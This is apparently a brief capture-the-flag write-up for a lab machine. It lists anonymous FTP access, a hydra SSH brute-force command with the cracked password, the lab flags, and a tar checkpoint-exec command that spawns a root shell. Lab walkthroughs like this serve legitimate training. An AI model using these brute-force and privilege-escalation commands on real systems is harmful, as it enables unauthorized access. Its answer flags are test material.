<pre>
Machine IP: 10.10.129.111

Enum:
    Open ports:
        21 ftp anonymous login allowed!
        22 ssh
        80 http



Login anonymous to ftp and find 
Locks.txt -> some creds
Task.txt -> answ


Lets brute force ssh(hydra):
    hydra -l lin -P locks.txt 10.10.129.111 -t 4 ssh
    login: lin   password: RedDr4gonSynd1cat3

Flags:
User:THM{CR1M3_SyNd1C4T3}
root: THM{80UN7Y_h4cK3r}



Take root:
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

And cat root in /root/root.txt

refs
https://gtfobins.github.io/gtfobins/tar/
</pre>
